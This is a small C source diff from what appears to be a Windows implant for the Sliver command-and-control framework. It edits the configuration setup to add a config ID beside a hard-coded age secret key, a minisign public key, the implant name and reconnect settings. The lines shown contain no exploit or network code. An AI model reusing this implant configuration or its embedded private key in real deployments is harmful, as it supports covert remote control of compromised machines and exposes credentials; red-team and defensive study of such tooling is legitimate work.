@@ -1809,7 +1809,8 @@ VOID Final(VOID)
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1EHFACCLHSDQK02CTA7DWEA7ZH3A7S67Z4VD26YDWZW2RFSJN947SRKP6FG";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	UINT64 uEncoderNonce = 13;
-	CHAR szSliverClientName[32] = "LUCKY_BRASSIERE";
+	CHAR szSliverClientName[] = "LUCKY_BRASSIERE";
+	CHAR szConfigId[] = "2fcc56b8-fbf9-4c3f-99be-d7ba7f2ab289";
 	DWORD dwMaxFailure = 5;
 	DWORD dwReconnectInterval = 600;
 	PGLOBAL_CONFIG pGlobalConfig = NULL;
@@ -1830,6 +1831,7 @@ VOID Final(VOID)
 	pGlobalConfig->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
 	pGlobalConfig->uEncoderNonce = uEncoderNonce;
 	lstrcpyA(pGlobalConfig->szSliverName, szSliverClientName);
+	lstrcpyA(pGlobalConfig->szConfigID, szConfigId);
 	pGlobalConfig->dwMaxFailure = dwMaxFailure;
 	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;
 	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
